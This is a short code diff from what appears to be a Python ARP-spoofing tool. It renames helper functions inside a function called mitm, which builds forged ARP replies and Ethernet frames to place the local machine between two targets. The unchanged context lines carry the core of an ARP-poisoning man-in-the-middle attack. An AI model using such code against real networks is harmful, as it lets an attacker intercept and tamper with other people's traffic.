@@ -26,10 +26,10 @@ def mitm(target1, target2, device):
     arp2 = dpkt.arp.ARP()
 
     arp2.op = arp1.op = dpkt.arp.ARP_OP_REPLY # set the ARP opcode
-    arp2.sha = arp1.sha = functs.eth_aton(functs.getDeviceMac(device)) # get the local mac address and assign it
+    arp2.sha = arp1.sha = functs.eth_aton(functs.get_device_mac(device)) # get the local mac address and assign it
 
-    arp1.tha = functs.eth_aton(functs.getMac(target1, device)) # get mac address for targets
-    arp2.tha = functs.eth_aton(functs.getMac(target2, device))
+    arp1.tha = functs.eth_aton(functs.get_mac(target1, device)) # get mac address for targets
+    arp2.tha = functs.eth_aton(functs.get_mac(target2, device))
     arp1.spa = socket.inet_aton(target2)
     arp2.spa = socket.inet_aton(target1)
     arp1.tpa = socket.inet_aton(target1)
@@ -38,7 +38,7 @@ def mitm(target1, target2, device):
     eth1 = dpkt.ethernet.Ethernet() # create Ethernet objects
     eth2 = dpkt.ethernet.Ethernet()
 
-    eth1.src = eth2.src = functs.eth_aton(functs.getDeviceMac(device))
+    eth1.src = eth2.src = functs.eth_aton(functs.get_device_mac(device))
     eth1.dst = arp1.tha
     eth2.dst = arp2.tha
 
